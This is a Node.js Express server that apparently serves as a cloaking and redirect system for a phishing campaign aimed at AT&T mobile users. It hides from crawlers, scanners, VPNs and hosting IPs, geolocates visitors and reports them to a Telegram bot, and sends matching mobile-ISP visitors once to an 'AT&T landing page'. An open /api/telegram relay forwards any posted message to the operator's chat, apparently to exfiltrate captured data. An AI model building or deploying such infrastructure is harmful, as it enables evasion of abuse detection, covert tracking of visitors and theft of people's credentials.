require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const fs = require('fs').promises;
const fssync = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// Trust proxy for accurate IP detection behind load balancers
app.set('trust proxy', 1);

// Path to store visited IPs
const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');

// Ensure the file exists
if (!fssync.existsSync(VISITED_IPS_FILE)) {
    fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
}

async function getVisitedIps() {
    try {
        const data = await fs.readFile(VISITED_IPS_FILE, 'utf8');
        let ips = JSON.parse(data);
        
        // Filter out IPs older than 24 hours
        const now = Date.now();
        const twentyFourHours = 24 * 60 * 60 * 1000;
        const freshIps = ips.filter(entry => {
            // Support both old format (string) and new format (object)
            const timestamp = typeof entry === 'object' ? entry.timestamp : 0;
            return (now - timestamp) < twentyFourHours;
        });

        if (freshIps.length !== ips.length) {
            await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(freshIps, null, 2));
        }
        return freshIps;
    } catch (e) {
        return [];
    }
}

async function addVisitedIp(ip) {
    const ips = await getVisitedIps();
    const existingIndex = ips.findIndex(entry => (typeof entry === 'object' ? entry.ip : entry) === ip);
    
    if (existingIndex === -1) {
        ips.push({ ip, timestamp: Date.now() });
        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
    } else if (typeof ips[existingIndex] !== 'object') {
        // Update old format to new format
        ips[existingIndex] = { ip, timestamp: Date.now() };
        await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
    }
}

async function removeVisitedIp(ip) {
    const ips = await getVisitedIps();
    const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
    await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
}

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// IMPORTANT: Set these environment variables in your hosting provider
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin123'; // Default for safety, but should be set in env

const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");

const BOT_USER_AGENTS = [
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
    'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless'
];

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
    console.error('ERROR: All required environment variables must be set');
}

// Security: Use Helmet for security headers
app.use(helmet({
    contentSecurityPolicy: false, // Set to false if you have complex external scripts
}));

// Crawler Protection: Set X-Robots-Tag to prevent indexing
app.use((req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
    next();
});

// Rate Limiting: Prevent abuse
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per window
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many requests, please try again later.'
});
app.use(limiter);

app.use(express.json());

// Serve only the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve robots.txt to disallow all crawlers
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send("User-agent: *\nDisallow: /");
});

// Helper to check for bots
function isBot(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (!ua) return true;
    return BOT_USER_AGENTS.some(bot => ua.includes(bot));
}

// Admin Authentication Middleware
function requireAdmin(req, res, next) {
    const token = req.headers['x-admin-token'] || req.query.token;
    if (token !== ADMIN_TOKEN) {
        return res.status(401).send('Unauthorized: Invalid Admin Token');
    }
    next();
}

// Main endpoint to determine redirect
app.get('/init', async (req, res) => {
    if (isBot(req)) {
        return res.json({ redirect: NON_ATT_LANDING_PAGE });
    }

    let clientIp = req.ip;
    
    // Check if user has already visited the ATT landing page
    const visitedIps = await getVisitedIps();
    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
    if (isVisited) {
        return res.json({ redirect: NON_ATT_LANDING_PAGE });
    }

    let data = null;
    try {
        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
        data = response.data;
    } catch (error) {
        console.error('ISP lookup failed:', error.message);
    }

    // Security: Filter out proxies, VPNs, and Hosting providers (crawlers often use these)
    const isSuspicious = data && (data.proxy || data.hosting);

    // Send Telegram Notification (only for real users, not suspicious ones)
    if (!isSuspicious) {
        let message = `🚀 *New App Visit!* \n\n`;
        if (data && data.status === 'success') {
            message += `📍 *IP:* ${data.query}\n` +
                       `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
                       `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
        } else {
            message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
        }
        message += `🕒 *Time:* ${new Date().toLocaleString()}`;

        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
        } catch (e) {}
    }

    // Determine Redirect URL
    let targetUrl = NON_ATT_LANDING_PAGE;
    if (data && data.status === 'success' && !isSuspicious) {
        const userISP = (data.isp || data.org || "").toUpperCase();
        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
            targetUrl = '/go-att';
        }
    }

    res.json({ redirect: targetUrl });
});

// Admin Panel to manage visited IPs
app.get('/admin', requireAdmin, async (req, res) => {
    const ips = await getVisitedIps();
    const token = req.query.token || '';
    let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel - Visited IPs</title>
            <style>
                body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
                .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                table { border-collapse: collapse; width: 100%; margin-top: 20px; }
                th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                th { background-color: #f4f4f4; }
                .remove-btn { color: #d9534f; cursor: pointer; font-weight: bold; }
                .remove-btn:hover { text-decoration: underline; }
                .status { margin-bottom: 20px; color: #555; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Visited IPs Management</h1>
                <p class="status">These users have visited the AT&T landing page within the last 24 hours.</p>
                <table>
                    <thead>
                        <tr>
                            <th>IP Address</th>
                            <th>Visited At</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${ips.map(entry => {
                            const ip = typeof entry === 'object' ? entry.ip : entry;
                            const time = typeof entry === 'object' ? new Date(entry.timestamp).toLocaleString() : 'N/A';
                            return `
                                <tr>
                                    <td>${escapeHtml(ip)}</td>
                                    <td>${escapeHtml(time)}</td>
                                    <td><span class="remove-btn" onclick="removeIp('${escapeHtml(ip)}')">Allow Revisit</span></td>
                                </tr>
                            `;
                        }).join('')}
                    </tbody>
                </table>
            </div>

            <script>
                async function removeIp(ip) {
                    if (confirm('Allow ' + ip + ' to revisit the landing page?')) {
                        const response = await fetch('/api/admin/remove?token=${token}', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ ip })
                        });
                        if (response.ok) {
                            window.location.reload();
                        } else {
                            alert('Failed to remove IP');
                        }
                    }
                }
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

// Endpoint to remove an IP from the visited list
app.post('/api/admin/remove', requireAdmin, async (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).send('IP is required');
    await removeVisitedIp(ip);
    res.status(200).send('IP removed successfully');
});

// Redirect to AT&T landing page
app.get('/go-att', async (req, res) => {
    const clientIp = req.ip;
    await addVisitedIp(clientIp);
    res.redirect(ATT_LANDING_PAGE);
});

// Secured Telegram API
app.post('/api/telegram', async (req, res) => {
    if (isBot(req)) return res.status(403).send('Forbidden');

    const { message } = req.body;
    if (!message) return res.status(400).send('Message is required');

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
        res.status(500).send('Failed to send message');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
